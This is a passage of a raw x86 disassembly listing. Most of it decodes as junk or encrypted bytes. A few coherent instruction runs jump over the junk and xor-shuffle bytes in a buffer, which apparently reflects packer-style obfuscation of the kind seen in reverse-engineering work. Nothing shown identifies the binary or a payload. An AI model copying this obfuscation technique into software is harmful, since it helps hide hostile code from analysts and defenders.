  4049bb:	or     BYTE PTR [ebx],ah
  4049bd:	jo     0x404a05
  4049bf:	mov    esi,0x5503d033
  4049c4:	in     al,dx
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    DWORD PTR [ecx],esi
  4049d7:	ins    BYTE PTR es:[edi],dx
  4049d8:	stc    
  4049d9:	ret    
  4049da:	xchg   ecx,eax
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x40496e
  4049e3:	(bad)  
  4049e5:	xor    BYTE PTR [ebx-0x5c],dh
  4049e8:	fs sti 
  4049ea:	in     eax,0xd3
  4049ec:	ja     0x404a27
  4049ee:	sub    BYTE PTR [eax],dh
  4049f0:	mov    esi,0x4074bbc7
  4049f5:	and    bh,0x42
  4049f8:	xor    eax,0x73465034
  4049fd:	clc    
  4049fe:	fs push 0xb0643a12
  404a04:	mov    cl,0xf7
  404a06:	scas   eax,DWORD PTR es:[edi]
  404a07:	and    al,0x76
  404a09:	jo     0x404a7d
  404a0b:	fcmovne st,st(6)
  404a0d:	js     0x404a12
  404a0f:	ss sbb eax,0xb86fae7c
  404a15:	pop    esp
  404a16:	mov    dl,0xfa
  404a18:	(bad)  
  404a19:	mov    BYTE PTR [edi+0x165c94aa],0x5a
  404a20:	jmp    0xfeb839d1
  404a25:	(bad)
  404a28:	sub    al,0x59
  404a2a:	jge    0x404a48
  404a2c:	push   esi
  404a2d:	mov    DWORD PTR [edi],ecx
  404a2f:	inc    esi
  404a30:	mov    ds:0xa8c447e9,al
  404a35:	jbe    0x404a20
  404a37:	mov    dl,0x67
  404a39:	rcr    BYTE PTR [esi-0x3a],0xef
  404a3d:	pop    ds
  404a3e:	xor    ebx,DWORD PTR [ebx-0x74b9a18c]
  404a44:	sub    BYTE PTR [ebx+edi*1-0x189d5a76],0xc2
  404a4c:	pushf  
  404a4d:	push   cs
  404a4e:	adc    bh,ch
  404a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a51:	jnp    0x404a06
  404a53:	xchg   ecx,eax
  404a54:	xor    DWORD PTR [esi],eax
  404a56:	xor    al,0xd3
  404a58:	pusha  
  404a59:	xchg   esp,eax
  404a5a:	out    dx,al
  404a5b:	mov    edi,?
  404a5d:	xchg   esi,eax
  404a5e:	xchg   edx,eax
  404a5f:	inc    ebx
  404a60:	jno    0x404a82
  404a62:	xor    eax,0xe135fff
  404a67:	xchg   esp,eax
  404a68:	push   ds
  404a69:	test   DWORD PTR [esi-0x4ae84ec6],0x935620a2
  404a73:	cmp    eax,DWORD PTR [ebx-0x4fab6321]
  404a79:	xor    esp,esp
  404a7b:	sbb    ebx,DWORD PTR ds:0xdd476b46
  404a81:	cli    
  404a82:	xor    al,0x43
  404a84:	and    BYTE PTR ds:0xd59d2760,bh
  404a8a:	jl     0x404aff
  404a8c:	sub    DWORD PTR [edi+0x7d6beba],0xffffffee
  404a93:	test   al,0x1d
  404a95:	xor    ebp,esp
  404a97:	es iret 
  404a99:	mov    eax,0x8b2227de
  404a9e:	out    0x9a,al
  404aa0:	nop
  404aa1:	lahf   
  404aa2:	std    
  404aa3:	cs es aad 0x6e
  404aa7:	popa   
  404aa8:	mov    ebx,0x976cf9
  404aad:	inc    esp
  404aae:	jne    0x404a96
  404ab0:	sbb    DWORD PTR [eax-0x35],esp
  404ab3:	pushf  
  404ab4:	jo     0x404b2e
  404ab6:	(bad)  [edi+0x5ac1e81c]
  404abc:	mov    eax,ds:0xd8f3fe02
  404ac1:	stos   BYTE PTR es:[edi],al
  404ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ac3:	outs   dx,BYTE PTR ds:[esi]
  404ac4:	rcr    al,0x33
  404ac7:	add    bh,cl
  404ac9:	jnp    0x404aa4
  404acb:	sbb    al,0x73
  404acd:	fwait
  404ace:	mov    dh,0xbc
  404ad0:	idiv   BYTE PTR fs:[ebx]
  404ad3:	scas   al,BYTE PTR es:[edi]
  404ad4:	jb     0x404b31
  404ad6:	lea    edi,ds:0xb4de68c1
  404adc:	ror    BYTE PTR ds:0x72b5225a,cl
  404ae2:	fstp   QWORD PTR [edi-0x265a62d0]
  404ae8:	nop
  404ae9:	xor    BYTE PTR [edi],0xbc
  404aec:	pushf  
  404aed:	jmp    0x404a81
  404aef:	daa    
  404af0:	sub    esi,DWORD PTR [ebp-0x253b736]
  404af6:	jmp    DWORD PTR [ecx]
  404af8:	mov    ds:0xfa8e0339,eax
  404afd:	or     eax,0xdcdd2f59
  404b02:	out    0x3,al
  404b04:	pavgb  mm1,QWORD PTR [ebx]
  404b07:	lock or BYTE PTR [ecx+ebx*8],0x3d
  404b0c:	inc    ebp
  404b0d:	add    esi,DWORD PTR [edx]
  404b0f:	adc    al,0xe4
  404b11:	inc    ebx
  404b12:	(bad)  
  404b13:	push   ebp
  404b14:	cmp    esp,edx
  404b16:	mov    ah,0x52
  404b18:	retf   
  404b19:	cmp    eax,0xecc1892a
  404b1e:	jle    0x404b01
  404b20:	pop    ebx
  404b21:	out    dx,al
  404b22:	add    BYTE PTR [edx],ch
  404b24:	in     eax,dx
  404b25:	inc    esp
  404b26:	loopne 0x404b5b
  404b28:	push   0x7e
  404b2a:	imul   BYTE PTR [esi-0x69]
  404b2d:	test   eax,0x4bb28cb
  404b32:	pop    ebp
  404b33:	jns    0x404b74
  404b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b36:	push   0x69491b3
  404b3b:	push   eax
  404b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b3d:	imul   edi,DWORD PTR [edi],0x927cf623
  404b43:	push   ebp
  404b44:	jmp    0x876e597f
  404b49:	and    ah,BYTE PTR [ebp-0x74]
  404b4c:	int3   
  404b4d:	jecxz  0x404b92
  404b4f:	das    
  404b50:	pop    edx
  404b51:	inc    ebx
  404b52:	xchg   ecx,eax
  404b53:	sbb    DWORD PTR [ebp-0x10bfdc35],ecx
  404b59:	pop    edx
  404b5a:	sbb    BYTE PTR [eax+0xed3ecc2],0x5d
  404b61:	call   0x5091:0x5cb13305
  404b68:	dec    esp
  404b69:	popf   
  404b6a:	xlat   BYTE PTR ds:[ebx]
  404b6b:	lods   eax,DWORD PTR ds:[esi]
  404b6c:	or     ch,BYTE PTR [ecx-0x3e]
  404b6f:	mov    edi,DWORD PTR [ebp-0x1c]
  404b72:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404b79:	mov    BYTE PTR [ebp+0xb],dl
  404b7c:	mov    dl,BYTE PTR [ebp+0xf]
  404b7f:	mov    edi,DWORD PTR [ebp-0xc]
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	push   DWORD PTR [eax-0x3f]
  404b9b:	jg     0x404bcb
  404b9d:	cs jle 0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404b9f
  404ba5:	popf   
  404ba6:	push   edx
  404ba7:	inc    edi
  404ba8:	cld    
  404ba9:	mov    ebp,eax
  404bab:	fild   WORD PTR [ecx+0x74016844]
  404bb1:	enter  0xd669,0xd4
  404bb5:	add    edi,esi
  404bb7:	mov    eax,0x4473d8b
  404bbc:	fld    QWORD PTR [eax-0x8]
  404bbf:	out    0xf6,eax
  404bc1:	xor    DWORD PTR [ebp-0x4b1fa5b0],ebp
  404bc7:	and    eax,0xe017aa5a
  404bcc:	inc    ebp
  404bcd:	pop    es
  404bce:	mov    ds,WORD PTR fs:0xe4e13bd7
  404bd5:	dec    ebp
  404bd6:	and    BYTE PTR [ecx],0x6c
  404bd9:	outs   dx,DWORD PTR ds:[esi]
  404bda:	loop   0x404b9a
  404bdc:	push   cs
  404bdd:	mov    eax,edx
  404bdf:	xor    eax,DWORD PTR [esi+eax*1]
  404be2:	sub    BYTE PTR [ecx],bl
  404be4:	mov    al,ds:0xa9ec13bf
  404be9:	add    eax,0xe26d94c3
  404bee:	jo     0x404b82
  404bf0:	dec    edx
  404bf1:	js     0x404bdb
  404bf3:	push   edx
  404bf4:	xor    edi,ecx
  404bf6:	sbb    esi,DWORD PTR es:[ebx+0xb3a8ec7]
  404bfd:	cwde   
  404bfe:	xor    BYTE PTR [ecx+0x405e7a92],0x21
  404c05:	push   edi
  404c06:	jo     0x404bfd
  404c08:	pop    edx
  404c09:	addr16 mov ecx,ebx
  404c0c:	mov    WORD PTR [eax],ds
  404c0e:	(bad)  
  404c10:	inc    eax
  404c11:	fcomp  st(0)
  404c13:	les    ecx,FWORD PTR [esp+eiz*8+0x11]
  404c17:	mov    sp,0x36cb
  404c1b:	lea    esi,[edi]
  404c1d:	ins    DWORD PTR es:[edi],dx
  404c1e:	shr    esp,0xd9
  404c21:	scas   al,BYTE PTR es:[edi]
  404c22:	xor    eax,0xa594519
  404c27:	push   gs
  404c29:	loop   0x404bdc
  404c2b:	add    al,0x69
  404c2e:	nop
  404c2f:	jae    0x404bde
  404c31:	dec    ebp
  404c32:	ins    DWORD PTR es:[edi],dx
  404c33:	dec    esi
  404c34:	jmp    0x74f5:0x60cd2cb7
  404c3b:	jle    0x404c9d
  404c3d:	ror    DWORD PTR [edx],1
  404c3f:	pop    ds
  404c40:	push   edi
  404c41:	push   esp
  404c42:	(bad)  
  404c43:	in     al,dx
  404c44:	or     DWORD PTR [eax-0x226a0eb3],edx
  404c4a:	mov    ebx,DWORD PTR [eax-0x4f]
  404c4d:	cmp    al,0x91
  404c4f:	mov    ch,0xd
  404c51:	sub    BYTE PTR [edi-0x1a64ab0b],bh
  404c57:	enter  0xaeb8,0xaf
  404c5b:	inc    esp
  404c5c:	mov    dl,0x31
  404c5e:	sbb    ah,BYTE PTR [edi-0x46]
  404c61:	test   eax,0xfeb02244
  404c66:	add    dh,ch
  404c68:	aam    0x49
  404c6a:	jp     0x404cb5
  404c6c:	stos   DWORD PTR es:[edi],eax
  404c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c6e:	mov    BYTE PTR [eax-0x17],bl
  404c71:	cmc    
  404c72:	mov    WORD PTR [eax],?
  404c74:	pop    edi
  404c75:	pop    ds
  404c76:	gs mov ah,0xe4
  404c79:	pop    es
  404c7a:	cmp    eax,0x33539755
  404c7f:	pop    esi
  404c80:	and    eax,0xd379648b
  404c85:	ret    0x8f69
  404c88:	leave  
  404c89:	jecxz  0x404c89
  404c8b:	pusha  
  404c8c:	not    DWORD PTR [ebx+eiz*1]
  404c8f:	sti    
  404c90:	stc    
  404c91:	out    dx,eax
  404c92:	retf   0x8215
  404c95:	pusha  
  404c96:	pop    edi
  404c97:	jo     0x404c9c
  404c99:	inc    edx
  404c9a:	leave  
  404c9b:	xchg   DWORD PTR [ecx],edi
  404c9d:	jge    0x404c90
  404c9f:	dec    esp
  404ca0:	sbb    dh,BYTE PTR [edi+0x1a6834df]
  404ca6:	retf   0x89d2
  404ca9:	sub    al,BYTE PTR [edx-0x8]
  404cac:	lods   al,BYTE PTR ds:[esi]
  404cad:	push   ss
  404cae:	xor    bh,BYTE PTR [edx+edi*8-0x75]
  404cb2:	call   0x6eede903
  404cb7:	loop   0x404d32
  404cb9:	sub    al,0x0
  404cbb:	lea    esp,[ecx-0x577d1d87]
  404cc1:	mov    edx,0xa80ea8f7
  404cc6:	dec    esp
  404cc7:	loopne 0x404c90
  404cc9:	aas    
  404cca:	ins    BYTE PTR es:[edi],dx
  404ccb:	pop    ecx
  404ccc:	aam    0x6d
  404cce:	inc    ebp
  404ccf:	mov    bl,bl
  404cd1:	fcmovnb st,st(0)
  404cd3:	xor    DWORD PTR [ebx],0xffffffd1
  404cd6:	sub    ebx,ebp
  404cd8:	inc    esp
  404cd9:	or     esp,DWORD PTR [ebx+0x3ffa67fe]
  404cdf:	ds je  0x404d2f
  404ce2:	out    dx,al
  404ce3:	ins    BYTE PTR es:[edi],dx
  404ce4:	test   eax,0x4c36e437
  404ce9:	xchg   esp,eax
  404cea:	and    dh,ah
  404cec:	and    edi,DWORD PTR [edi+0x50992c07]
  404cf2:	push   esi
  404cf3:	mov    ds:0x8d89200c,al
  404cf8:	cmc    
  404cf9:	fnstcw WORD PTR [ebp+0x7c]
  404cfc:	ds jmp 0x8ac65b97
  404d02:	pop    ds
  404d03:	add    eax,0x7a16c841
  404d08:	sub    al,0xfa
  404d0a:	repnz sub al,bl
  404d0d:	gs cwde 
  404d0f:	mov    WORD PTR [esi],fs
  404d11:	fdivr  DWORD PTR [ebx+0x20]
  404d14:	xlat   BYTE PTR ds:[ebx]
  404d15:	mov    al,0x5b
  404d17:	stc    
  404d18:	jle    0x404d53
  404d1a:	push   ss
  404d1b:	mov    ds:0x305e19c9,al
  404d20:	ret    
  404d21:	and    dh,dl
  404d23:	xor    BYTE PTR [edx],cl
  404d25:	lahf   
  404d26:	test   eax,0x5b167dae
  404d2b:	in     eax,dx
  404d2c:	pop    esi
  404d2d:	push   ecx
  404d2e:	in     eax,0xdf
  404d30:	xchg   ebx,eax
  404d31:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d34:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d3b:	mov    dl,BYTE PTR [ebp+0xb]
  404d3e:	mov    edi,DWORD PTR [ebp-0x18]
  404d41:	xor    edi,eax
  404d43:	add    edi,DWORD PTR [ebp-0x14]
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    BYTE PTR [edi-0x4419f53a],al
  404d97:	das    
  404d98:	jle    0x404e18
  404d9a:	mov    edi,DWORD PTR [edi+0x7e]
  404d9d:	jle    0x404da5
  404d9f:	gs inc ecx
  404da1:	test   BYTE PTR [edi-0x66329000],cl
  404da7:	mov    WORD PTR [esi-0x3e],?
  404daa:	inc    ecx
  404dab:	out    0xf7,eax
  404dad:	xchg   edx,eax
  404dae:	pop    es
  404daf:	and    al,0xdc
  404db1:	pop    ebp
  404db2:	cmp    DWORD PTR [edi-0x7e5c950],0xffffffa1
  404db9:	int3   
  404dba:	rcl    ch,cl
  404dbc:	retf   0x6084
  404dbf:	cmp    esp,ebx
  404dc1:	add    ebx,DWORD PTR [ebx]
  404dc3:	sbb    dh,ch
  404dc5:	push   eax
  404dc6:	call   0x9378:0x70d63a4c
  404dcd:	mov    dl,0x8b
  404dcf:	sbb    edi,ecx
  404dd1:	jge    0x404dce
  404dd3:	repz xchg ebp,eax
  404dd5:	or     eax,0xa68254ce
  404dda:	pop    esp
  404ddb:	pop    edi
  404ddc:	mov    ecx,0x77845497
  404de1:	mov    ebx,DWORD PTR [eax-0x742b7aaa]
  404de7:	adc    edi,eax
  404de9:	shl    DWORD PTR [ecx-0x25],1
  404dec:	xchg   ecx,eax
  404ded:	adc    BYTE PTR [edi+0x12fbc6a5],al
  404df3:	fsub   st,st(5)
  404df5:	popf   
  404df6:	push   es
  404df7:	pop    esi
  404df8:	mov    dh,0x71
  404dfa:	sqrtps xmm1,xmm5
  404dfd:	and    esi,DWORD PTR [edx-0x4e00359b]
  404e03:	ins    DWORD PTR es:[edi],dx
  404e04:	dec    edx
  404e05:	in     eax,0x3e
  404e07:	fcomp  DWORD PTR [ebp-0x294fc93e]
  404e0d:	adc    dl,bh
  404e0f:	jae    0x404df6
  404e11:	or     eax,0xd802dfc4
  404e16:	cmp    al,0x11
  404e18:	frstor [edi]
  404e1a:	and    esp,ecx
  404e1c:	in     al,0x27
  404e1e:	hlt    
  404e1f:	mov    WORD PTR ds:0xa3f805c0,fs
  404e25:	nop
  404e26:	in     al,0xfa
  404e28:	cmp    dh,BYTE PTR [esi-0x55]
  404e2b:	add    eax,0x1e2e48b2
  404e30:	dec    esi
  404e31:	xchg   ebx,eax
  404e32:	pop    esi
  404e33:	jge    0x404dc9
  404e35:	cmp    dl,ch
  404e37:	scas   al,BYTE PTR es:[edi]
  404e38:	out    0x4c,eax
  404e3a:	mov    edx,0xab747368
  404e3f:	mov    al,ds:0x1dfe42b3
  404e44:	or     edi,DWORD PTR [ebx]
  404e46:	xchg   ecx,eax
  404e47:	xchg   BYTE PTR [esi+0x45ef2b26],ah
  404e4d:	fwait
  404e4e:	sub    esi,DWORD PTR [edi]
  404e50:	std    
  404e51:	jns    0x404e7e
  404e53:	or     DWORD PTR [ecx-0x59],esi
  404e56:	xor    al,BYTE PTR [ecx+edi*8-0x6ebcbdb1]
  404e5d:	mov    ch,0xd7
  404e5f:	mov    edx,0xbdbd18e1
  404e64:	fcom   QWORD PTR [edi]
  404e66:	mov    dh,0x40
  404e68:	cmp    BYTE PTR [ebp+ebp*2+0x2aeb276a],bl
  404e6f:	fs (bad) 
  404e72:	sub    DWORD PTR [ebx],ebx
  404e74:	mov    ch,0xc
  404e76:	push   esi
  404e77:	sub    ch,BYTE PTR ds:0x698d044
  404e7d:	cmp    edx,DWORD PTR [ebp-0x59]
  404e80:	xchg   ecx,eax
  404e81:	pop    esi
  404e82:	mov    al,0x86
  404e84:	into   
  404e85:	inc    ebp
  404e86:	mov    ecx,0x66150306
  404e8b:	pop    ds
  404e8c:	fs aam 0x52
  404e8f:	xor    DWORD PTR [esp+ebp*8],edi
  404e92:	scas   eax,DWORD PTR es:[edi]
  404e93:	and    cl,ch
  404e95:	xor    al,0xbe
  404e97:	xor    al,0x54
  404e99:	cs jns 0x404e4d
  404e9c:	jmp    0x404ef1
  404e9e:	lods   al,BYTE PTR ds:[esi]
  404e9f:	sti    
  404ea0:	test   BYTE PTR [eax],bh
  404ea2:	jae    0x404ea2
  404ea4:	cmp    al,0xee
  404ea6:	sub    DWORD PTR [ecx-0x2a403ecf],edx
  404eac:	lods   al,BYTE PTR ds:[esi]
  404ead:	adc    BYTE PTR [ebp-0x4f511088],ah
  404eb3:	and    al,BYTE PTR [ebp-0x12c35c19]
  404eb9:	adc    al,0xec
  404ebb:	imul   BYTE PTR [eax-0x72]
  404ebe:	mov    eax,0x80304018
  404ec3:	or     eax,0x7bb69c84
  404ec8:	xchg   ecx,eax
  404ec9:	fwait
  404eca:	lods   eax,DWORD PTR ds:[esi]
  404ecb:	or     DWORD PTR [ebp+0x49249fd3],ebx
  404ed1:	ins    BYTE PTR es:[edi],dx
  404ed2:	cmp    esi,edx
  404ed4:	lds    ecx,FWORD PTR [edi-0x72302284]
  404eda:	jmp    0x68974091
  404edf:	mov    al,0x73
  404ee1:	mov    ecx,0xa9028fff
  404ee6:	popf   
  404ee7:	cmp    DWORD PTR [edx+eax*8+0x9ddb317],edx
  404eee:	jbe    0x404f34
  404ef0:	xor    eax,0x7730d131
  404ef5:	sbb    esp,esi
  404ef7:	xchg   esp,eax
  404ef8:	and    eax,0x559a2bd6
  404efd:	int    0x36
  404eff:	icebp  
  404f00:	mov    bl,0x35
  404f02:	popf   
  404f03:	shl    BYTE PTR [ecx+0x41d56772],1
  404f09:	imul   edx,DWORD PTR [edi],0xffffffbf
  404f0c:	jl     0x404eae
  404f0e:	cld    
  404f0f:	pop    edi
  404f10:	and    DWORD PTR [edx],edi
  404f12:	ins    BYTE PTR es:[edi],dx
  404f13:	xchg   edx,eax
  404f14:	push   ebp
  404f15:	call   0xf20d112a
  404f1a:	je     0x404ec1
  404f1c:	sahf   
  404f1d:	(bad)  
  404f1e:	fidiv  DWORD PTR [eax]
  404f20:	pop    ds
  404f21:	mov    ds:0x1c4c25e4,eax
  404f26:	add    al,0x61
  404f28:	or     BYTE PTR [ecx],ah
  404f2a:	mov    ch,0x33
  404f2c:	clc    
  404f2d:	add    edi,ecx
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0x22d15a29
  404f44:	loopne 0x404ed5
  404f46:	jne    0x404f10
  404f48:	and    DWORD PTR [esi+0x7e],edi
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404ef9
  404f50:	xchg   edx,eax
  404f51:	aaa    
  404f52:	mov    eax,0x9a4defac
  404f57:	pop    ebx
  404f58:	call   0x60c46a81
  404f5d:	dec    esp
  404f5e:	div    DWORD PTR [ebx]
  404f60:	add    ebx,DWORD PTR [ebx]
  404f62:	fwait
  404f63:	lods   al,BYTE PTR ds:[esi]
  404f64:	repz dec ebx
  404f66:	jp     0x404eff
  404f68:	mov    edx,0xfbaa71c7
  404f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f6e:	js     0x404fab
  404f70:	mov    ebp,0x6f1dd25d
  404f75:	ins    BYTE PTR es:[edi],dx
  404f76:	mov    ebx,0x753e8c4d
  404f7b:	mov    ah,0xc6
  404f7d:	push   ecx
  404f7e:	add    esp,DWORD PTR [ecx-0x3d]
  404f81:	mov    ebp,0x3c80814d
  404f86:	hlt    
  404f87:	and    esp,DWORD PTR [ebp+0x52]
  404f8a:	add    esi,ebp
  404f8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f8d:	or     eax,0x76b58945
  404f92:	dec    esi
  404f93:	cmp    bh,cl
  404f95:	popa   
  404f96:	cwde   
  404f97:	cmp    ebx,DWORD PTR [esi-0x78]
  404f9a:	add    DWORD PTR [esi+0x6f],esi
  404f9d:	jmp    0x404fd2
  404f9f:	xlat   BYTE PTR ds:[ebx]
  404fa0:	div    DWORD PTR [edi]
  404fa2:	cli    
  404fa3:	test   DWORD PTR [ebp-0x1aa633ae],ebp
  404fa9:	mov    dh,0xc2
  404fab:	push   0xffffffd6
  404fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fae:	pop    edx
  404faf:	add    BYTE PTR [esi+0x5f],dl
  404fb2:	sub    BYTE PTR [ebx+0x10beb6d5],0x62
  404fb9:	and    eax,0x7be16681
  404fbe:	leave  
  404fbf:	js     0x404f54
  404fc1:	in     eax,dx
  404fc2:	pop    eax
  404fc3:	xchg   ecx,eax
  404fc4:	cmc    
  404fc5:	ret    
  404fc6:	xor    ebp,DWORD PTR [ebp-0x6f64fec]
  404fcc:	cs gs mov bh,0x2f
  404fd0:	add    cl,BYTE PTR [esp+ebp*1]
  404fd3:	loopne 0x404fab
  404fd5:	jl     0x405012
  404fd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fd8:	jae    0x405057
  404fda:	adc    eax,0x4e5d51a9
  404fdf:	xor    al,0x41
  404fe1:	push   edi
  404fe2:	bound  esp,QWORD PTR [edx+0x516959f9]
  404fe8:	sub    dh,BYTE PTR [edi]
  404fea:	cmp    al,0x49
  404fec:	or     al,0xeb
  404fee:	push   0xd77e77db
  404ff3:	xor    ebx,edi
  404ff5:	inc    esi
  404ff6:	cwde   
  404ff7:	idiv   BYTE PTR [ecx-0x2860da64]
  404ffd:	mov    esp,0x540b8a21
  405002:	adc    eax,0x4314d659
  405007:	outs   dx,BYTE PTR ds:[esi]
  405008:	xchg   edi,eax
  405009:	mov    ds:0xd8d58c0a,al
  40500e:	dec    ebx
  40500f:	aad    0x2e
  405011:	xchg   ebp,eax
  405012:	jo     0x404fb4
  405014:	dec    esi
  405015:	call   0x161c:0x5663336c
  40501c:	adc    eax,0xd000bd2c
  405021:	cld    
  405022:	inc    edi
  405023:	inc    esp
  405024:	cli    
  405025:	(bad)  
  405027:	popa   
  405028:	ds mov bh,0xe7
  40502b:	ss jl  0x404fdb
  40502e:	les    ebp,FWORD PTR [ebx+0x50]
  405031:	aaa    
  405032:	test   al,0x5e
  405034:	mov    esp,0xb40e090b
  405039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40503a:	fwait
  40503b:	not    BYTE PTR [eax]
  40503d:	pop    ebp
  40503e:	xchg   ebp,eax
  40503f:	inc    esp
  405040:	mov    dh,0x71
  405042:	dec    esi
  405043:	fadd   QWORD PTR [edi+esi*4]
  405046:	dec    ebp
  405047:	push   edi
  405048:	pusha  
  405049:	and    DWORD PTR [edi],edx
  40504b:	mov    ch,0xfa
  40504d:	xchg   BYTE PTR [ebp+0x7],bl
  405050:	cmp    DWORD PTR [eax],eax
  405052:	hlt    
  405053:	or     DWORD PTR [ebp+0x36],esi
  405056:	hlt    
  405057:	rcr    BYTE PTR [ecx+0x5004ed9],1
  40505d:	and    ebx,eax
  40505f:	mov    ebp,edi
  405061:	gs xor eax,0x128e67e4
  405067:	push   0xfffffffe
  405069:	aas    
  40506a:	retf   0x59e3
  40506d:	in     al,dx
  40506e:	lahf   
  40506f:	mov    ebx,0x37896907
  405074:	ins    BYTE PTR es:[edi],dx
  405075:	aaa    
  405076:	add    esi,DWORD PTR [ecx+0x7b297014]
  40507c:	test   DWORD PTR [eax+0x1e4bb42e],eax
  405082:	or     eax,DWORD PTR [edx-0x36]
  405085:	sub    bl,ah
  405087:	mov    WORD PTR [esi],es
  405089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40508a:	ficomp WORD PTR [edx]
  40508c:	nop
  40508d:	or     dh,BYTE PTR ss:[ecx+0x533b662]
  405094:	push   ss
  405095:	mov    WORD PTR [edi+0x60233e90],ds
  40509b:	pop    ecx
  40509c:	push   ds
  40509d:	test   al,0xd1
  40509f:	cmp    al,0x6d
  4050a1:	sbb    al,0x72
  4050a3:	hlt    
  4050a4:	neg    esi
  4050a6:	cmp    DWORD PTR [ebp+0x43c6bde0],ebp
  4050ac:	add    esi,edx
  4050ae:	pushw  0x2c19
  4050b2:	mov    dl,0x4a
  4050b4:	je     0x4050ed
  4050b6:	lods   eax,DWORD PTR ds:[esi]
  4050b7:	fs int3 
  4050b9:	sub    al,0x30
  4050bb:	dec    ecx
  4050bc:	imul   ecx,edi,0x34b2ef38
  4050c2:	data16 ds icebp 
  4050c5:	mov    ds:0x83d548de,al
  4050ca:	cmp    ebx,DWORD PTR [edx+0x5ff0a992]
  4050d0:	mov    cl,0xfa
  4050d2:	ss or  edx,esp
  4050d5:	pop    ecx
  4050d6:	not    BYTE PTR [edi-0x2f]
  4050d9:	setge  BYTE PTR [ebx+ecx*4-0x27cc17a3]
  4050e1:	sub    edx,ecx
  4050e3:	lea    edi,[edi+ebx*1+0x32729d]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	aas    
  40510e:	sbb    al,0x16
  405110:	pop    ebx
  405111:	inc    ebp
  405112:	and    bh,BYTE PTR [esi+0x7e]
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x405176
  40511a:	lods   eax,DWORD PTR ds:[esi]
  40511b:	not    dh
  40511d:	lock xor bh,BYTE PTR [ebx]
  405120:	dec    esi
  405121:	push   edi
  405122:	loop   0x40510b
  405124:	push   ecx
  405125:	or     BYTE PTR [edi+0x5f],al
  405128:	mov    ch,0xee
  40512a:	mov    eax,ds:0x6f421b89
  40512f:	jnp    0x4050d0
  405131:	pop    esi
  405132:	(bad)  
  405133:	adc    edx,ebx
  405135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405136:	xor    al,0x43
  405138:	inc    edi
  405139:	pushf  
  40513a:	pop    esp
  40513b:	hlt    
  40513c:	test   DWORD PTR [edi],ecx
  40513e:	jb     0x40516f
  405140:	pusha  
  405141:	pop    ebx
  405142:	sub    al,0xd5
  405144:	and    al,0x4a
  405146:	push   ds
  405147:	into   
  405148:	arpl   WORD PTR [edx],di
  40514a:	jae    0x405131
  40514c:	dec    esp
  40514d:	sti    
  40514e:	mov    ebx,0x79dbcb5
  405153:	mov    al,0x21
  405155:	fnstsw ax
  405157:	or     esp,DWORD PTR ds:0x67cbd2f3
  40515d:	and    esi,DWORD PTR [ebx+ecx*4]
  405160:	sbb    ebp,DWORD PTR [ebp+0x28]
  405163:	jmp    0x4050fc
  405165:	pop    esp
  405166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405167:	push   ds
  405168:	call   0x3e81eaaa
  40516d:	cmp    BYTE PTR [ebp+0x3ed40288],dl
  405173:	mov    dl,ch
  405175:	clc    
